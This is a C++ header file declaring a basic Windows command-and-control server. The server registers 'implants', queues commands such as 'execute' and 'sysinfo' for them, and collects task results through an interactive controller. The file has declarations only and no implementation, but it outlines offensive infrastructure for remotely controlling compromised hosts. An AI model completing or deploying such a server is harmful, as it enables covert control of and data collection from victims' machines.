// c2_server.h
#ifndef C2_SERVER_H
#define C2_SERVER_H

#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <map>
#include <thread>
#include <vector>
#include <sstream>
#include <chrono>
#include <algorithm>

#pragma comment(lib, "ws2_32.lib")

struct ClientInfo {
    sockaddr_in address;
    SOCKET socket;
    std::string implant_id;
    time_t last_seen;
};

class BasicC2Server {
private:
    SOCKET server_socket;
    int port;
    bool running;
    std::map<std::string, std::vector<std::string>> command_queue;
    std::map<std::string, ClientInfo> connected_clients;
    std::map<std::string, std::string> task_results;
    
    // Private helper methods
    void initialize_winsock();
    void create_server_socket();
    void bind_server_socket();
    void start_listening();
    void cleanup_client(SOCKET client_socket);
    std::vector<std::string> split_string(const std::string& str, char delimiter);
    std::string get_client_ip(sockaddr_in client_addr);
    
public:
    // Constructor/Destructor
    BasicC2Server(int port = 4444);
    ~BasicC2Server();
    
    // Core functionality
    void start();
    void stop();
    void handle_client(SOCKET client_socket, sockaddr_in client_addr);
    std::string process_command(const std::string& implant_id, const std::string& command, const std::string& data);
    
    // Command management
    void queue_command(const std::string& implant_id, const std::string& command);
    std::vector<std::string> get_queued_commands(const std::string& implant_id);
    void clear_command_queue(const std::string& implant_id);
    
    // Client management
    void add_client(const std::string& implant_id, sockaddr_in address, SOCKET socket);
    void remove_client(const std::string& implant_id);
    std::vector<std::string> get_connected_clients();
    void update_client_last_seen(const std::string& implant_id);
    
    // Task management
    void store_task_result(const std::string& task_id, const std::string& result);
    std::string get_task_result(const std::string& task_id);
    
    // Logging
    void log(const std::string& message);
    void log_error(const std::string& message);
};

// Controller interface
namespace C2Controller {
    void start_interactive_controller(BasicC2Server* server);
    void print_banner();
    void handle_list_command(BasicC2Server* server);
    void handle_queue_command(BasicC2Server* server, const std::string& input);
    void handle_results_command(BasicC2Server* server);
    void print_help();
}

// Protocol constants
namespace C2Protocol {
    const std::string DELIMITER = "|";
    const std::string STATUS_SUCCESS = "success";
    const std::string STATUS_ERROR = "error";
    const std::string CMD_CHECKIN = "checkin";
    const std::string CMD_EXECUTE = "execute";
    const std::string CMD_SYSINFO = "sysinfo";
    const std::string CMD_GET_COMMANDS = "get_commands";
    const std::string CMD_TASK_RESULT = "task_result";
}

#endif // C2_SERVER_H